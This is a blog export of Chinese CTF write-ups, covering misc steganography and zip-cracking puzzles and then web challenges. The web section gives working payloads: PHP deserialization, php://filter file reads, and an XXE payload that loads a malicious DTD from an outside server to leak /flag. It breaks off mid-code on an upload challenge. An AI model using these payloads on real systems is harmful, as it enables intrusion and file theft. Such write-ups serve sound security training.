<p>xlsx表中有外源数据被隐藏了，大约是中间50行~1000行的部分被折叠了，展开再改颜色能看到两种不同的数字</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-5.png"></p>
<p>python提取数字后转换成10，画图后两张图拼在一起</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> pandas<br>s=<span class="hljs-number">55</span><br>s1=<span class="hljs-number">60</span><br>e=<span class="hljs-number">1023</span><br>e1=<span class="hljs-number">1028</span><br>l=<span class="hljs-number">0</span><br>r=<span class="hljs-number">63</span><br><br><br>img1=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">1050</span>,<span class="hljs-number">140</span>))<br><br>x1=pandas.read_excel(<span class="hljs-string">&quot;1.xlsx&quot;</span>)<br>x1values=x1.values<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s-<span class="hljs-number">2</span>,e-<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r):<br>        <span class="hljs-keyword">if</span> x1values[i][j]&gt;=<span class="hljs-number">5</span>:<br>            img1.putpixel((i,j),<span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img1.putpixel((i,j),<span class="hljs-number">0</span>)<br><br><br>x2=pandas.read_excel(<span class="hljs-string">&quot;2.xlsx&quot;</span>)<br>x2values=x2.values<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(s1-<span class="hljs-number">2</span>,e1-<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r):<br>        <span class="hljs-keyword">if</span> x2values[i][j]&gt;=<span class="hljs-number">5</span>:<br>            img1.putpixel((i-<span class="hljs-number">5</span>,j+<span class="hljs-number">63</span>),<span class="hljs-number">255</span>)<br>        <span class="hljs-keyword">else</span>:<br>            img1.putpixel((i-<span class="hljs-number">5</span>,j+<span class="hljs-number">63</span>),<span class="hljs-number">0</span>)<br>img1=img1.transpose(Image.FLIP_LEFT_RIGHT)<br>img1.save(<span class="hljs-string">&#x27;img.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>密码w0wyoudo4goodj0b</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-6.png"></p>
<p>对于wav的带密码的隐写，猜测是DeepSound</p>
<p>解密得到<code>flag.txt</code>和<code>fl4g.txt</code></p>
<p>fl4g.txt中的字符串先base85在base32，得到<code>sQ+3ja02RchXLUFmNSZoYPlr8e/HVqxwfWtd7pnTADK15Evi9kGOMgbuIzyB64CJ</code></p>
<p>观察发现恰好是64位，从a-z,A-Z,0-9,+,&#x2F;  猜测是base换表，flag.txt中的值作为密文</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-7.png"></p>
<h2 id="两只老虎"><a href="#两只老虎" class="headerlink" title="两只老虎"></a>两只老虎</h2><p>只给了一张图片，但是发现图片后面的IDAT突然变小了</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-8.png"></p>
<p>所以可以删掉前面所有长65536的IDAT块再删一个34018的IDAT块（参考正常的png图片）</p>
<p>爆破宽高，得到右边那张图片，发现右边多了一些像素</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-9.png"></p>
<p>原来的图片是1134x720，变成了1144x720</p>
<p>红色部分全是(255,0,0)，既然两图类似，就放stegsolve尝试xor，发现很多小像素点不规律分布</p>
<p>最后发现可以提取每行非黑色像素点的个数去转字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;solved.bmp&#x27;</span>)<br>w,h = img.size<br>count = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        pixel = img.getpixel((j,i))<br>        <span class="hljs-keyword">if</span>(pixel != (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)):<br>            tmp += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span>(tmp!=<span class="hljs-number">10</span>):<br>        count.append(tmp-<span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(count)<br><br>count = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(num) <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> count)<br><span class="hljs-built_in">print</span>(count)<br><span class="hljs-comment">#[68, 65, 83, 67, 84, 70, 123, 116, 87, 111, 95, 116, 49, 103, 101, 114, 115, 95, 114, 85, 110, 95, 102, 64, 115, 116, 125]</span><br><span class="hljs-comment">#DASCTF&#123;tWo_t1gers_rUn_f@st&#125;</span><br></code></pre></td></tr></table></figure>


<h2 id="Easy-VMDK"><a href="#Easy-VMDK" class="headerlink" title="Easy_VMDK"></a>Easy_VMDK</h2><blockquote>
<p>小明这次使用了32Bytes的随机密码，这次总不会被爆破出来了吧！！<br>小明压缩了好了题目后，他发现压缩后大小比压缩前还大啊，这不就没有压缩啊，这是为什么啊！</p>
</blockquote>
<p>对压缩包进行明文攻击，本地看下自己的几个vmdk文件头，发现均为<code>4B 44 4D 56 01 00 00 00 03 00 00 00</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-10.png"></p>
<p>拿到一个<code>flag.zip</code>和<code>key.txt</code></p>
<p>flag.zip分离出一个带密码的压缩包和一个py脚本，其中是key.txt的加密过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br><br>img = cv2.imread(<span class="hljs-string">&quot;key.png&quot;</span>)<br>r, c = img.shape[:<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(r, c)<br><span class="hljs-comment"># 137 2494</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            uu_byte = binascii.a2b_uu(<span class="hljs-string">&#x27;, &#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">str</span>(x), img[y, x])) + <span class="hljs-string">&quot;\n&quot;</span>)<br>            f.write(base64.b64encode(uu_byte).decode() + <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>解密过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 读取 key.txt 文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br><span class="hljs-comment"># 创建空白图像</span><br>img = np.zeros((<span class="hljs-number">137</span>, <span class="hljs-number">2494</span>), dtype=np.uint8)<br><br><span class="hljs-comment"># 还原图像像素值</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">137</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2494</span>):<br>        <span class="hljs-comment"># 解码 base64 数据</span><br>        encoded_data = lines[y * <span class="hljs-number">2494</span> + x].strip()<br>        decoded_data = base64.b85decode(encoded_data.encode())<br><br>        <span class="hljs-comment"># 获取像素值</span><br>        pixel_value = <span class="hljs-built_in">int</span>.from_bytes(decoded_data, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>) % <span class="hljs-number">256</span><br><br>        <span class="hljs-comment"># 设置图像像素</span><br>        img[y, x] = pixel_value<br><br><span class="hljs-comment"># 保存还原后的图像</span><br>cv2.imwrite(<span class="hljs-string">&quot;restored_key.png&quot;</span>, img)<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-11.png"></p>
<p>用这个密码去解压，得到flag</p>
<h2 id="GIFuck"><a href="#GIFuck" class="headerlink" title="GIFuck"></a>GIFuck</h2><p>根据帧长切割，利用ocr进行批量识别</p>
<p><code>++++[-&gt;++++&lt;]&gt;[-&gt;++++++&lt;]&gt;-[-&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]+++&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++.&lt;+++++[-&gt;+++++&lt;]&gt;+++.+++..+++++++.&lt;+++++++++[-&gt;---------&lt;]&gt;--------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++.&lt;++++[-&gt;++++&lt;]&gt;+++.-.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++++++++.&lt;+++[-&gt;---&lt;]&gt;-.++++++.---.&lt;+++++++++[-&gt;---------&lt;]&gt;-.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++.++++++.&lt;+++[-&gt;---&lt;]&gt;--.++++++.&lt;++++++++[-&gt;--------&lt;]&gt;-------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++.&lt;+++[-&gt;+++&lt;]&gt;+.&lt;+++++++++[-&gt;---------&lt;]&gt;--.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++++++++.+.+++++.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++.---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;+++[-&gt;---&lt;]&gt;----.&lt;+++++++[-&gt;-------&lt;]&gt;------.[-]&lt;</code></p>
<p>会输出<code>Sorry but your flag is not here.</code></p>
<p>真正的flag藏在内存中</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023ycb-misc-12.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>羊城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2023宁波市赛wp</title>
    <url>/%E7%AB%9E%E8%B5%9B/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9Bwp.html</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>sqlmap一把梭</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/Query.png"></p>
<h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//The location of the flag is at route.php</span><br><span class="hljs-variable">$read</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;read&quot;</span>];<br><span class="hljs-variable">$input</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;input&quot;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$read</span>) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$input</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$read</span>, <span class="hljs-string">&quot;f14g&quot;</span>)===<span class="hljs-literal">FALSE</span>)<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$read</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-variable">$input2</span> = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$input</span>;<br>    <span class="hljs-variable">$input2</span>-&gt;position = <span class="hljs-string">&quot;route.php&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>php://filter</code>读<code>route.php</code></p>
<p>得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;h1&gt;Here can you find the position of the flag!&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$position</span> = <span class="hljs-string">&quot;f14g.php&quot;</span>;<br><span class="hljs-variable">$gadget</span> = <span class="hljs-string">&quot;h1nt.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>再读<code>h1nt.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;position);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;position;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>反序列化，调用<code>__clone</code>方法时读<code>f14g.php</code><br>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$position</span>=<span class="hljs-string">&#x27;f14g.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//read=h1nt.php&amp;input=O:4:&quot;test&quot;:1:&#123;s:8:&quot;position&quot;;s:8:&quot;f14g.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure>


<h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;***********&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">or</span> !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])!== <span class="hljs-string">&quot;flag&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])!==<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用<code>php://input</code>使得a的值为<code>flag</code>，b同理，d使用<code>php://filter</code>读文件</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/CodeCheck.png"></p>
<h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>访问靶机自动跳转到<code>/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D</code>，并返回<code>json</code><br>访问<code>/parser?body=1</code>，返回<code>plain</code></p>
<p>猜测这是一个类型解析器，可以解析输入的数据类型并返回</p>
<p>fuzz后发现支持xml格式，尝试利用xxe漏洞。因为是java环境，尝试使用<code>jar协议</code>，<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#jar-x2F-x2F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">原理参考</a></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-1.png"></p>
<p>vps上用flask构建一个恶意dtd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">&lt;!ENTITY % c SYSTEM <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;<br>&lt;!ENTITY % a <span class="hljs-string">&quot;&lt;!ENTITY remote SYSTEM &#x27;jar:http://20.2.129.79/1.zip!/%c;&#x27;&gt;&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<p>在apache上放一个1.zip，内容随意</p>
<p>当<code>jar协议</code>在<code>1.zip</code>中找不到<code>file://</code>中指定的文件时就会报错，通过报错回显文件内容</p>
<p>且过滤了<code>&quot;http</code>，可以使用<code>&quot;url:http</code>来绕过</p>
<p>最终payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;url:http://20.2.129.79:7777/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-2.png"></p>
<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>打开靶机后有一个文件上传功能</p>
<p>但是对路径，后缀，文件内容进行了检测</p>
<p>路径中过滤了<code>..</code>，不能进行目录穿越，只能存放在<code>/tmp/</code>下，·且后缀检查的黑名单较严格</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_path</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = [<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&#x27;\.\.&#x27;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$black_list</span>) . <span class="hljs-string">&#x27;)/i&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$path</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$extension</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black_list</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;phtml&#x27;</span>, <span class="hljs-string">&#x27;py&#x27;</span>, <span class="hljs-string">&#x27;pl&#x27;</span>,<span class="hljs-string">&#x27;pyc&#x27;</span>,<span class="hljs-string">&#x27;php7&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;ini&#x27;</span>,<span class="hljs-string">&#x27;htaccess&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$extension</span>),<span class="hljs-variable">$black_list</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">up_base64</span>(<span class="hljs-params"><span class="hljs-variable">$file_path</span>, <span class="hljs-variable">$base64</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(data:\s*image\/(\w*);base64,)/&#x27;</span>, <span class="hljs-variable">$base64</span>, <span class="hljs-variable">$result</span>)) &#123;<br><br>        <span class="hljs-variable">$type</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">time</span>() . <span class="hljs-string">&quot;/&quot;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$res</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$res</span>, <span class="hljs-number">0777</span>);<br>        &#125;<br>        <span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;    <span class="hljs-comment">//图片名以时间命名</span><br>        <span class="hljs-comment">//保存为文件</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$newFile</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$base64</span>)))) &#123;<br>            <span class="hljs-comment">//返回这个图片的路径</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$newFile</span>;<br>        &#125; <span 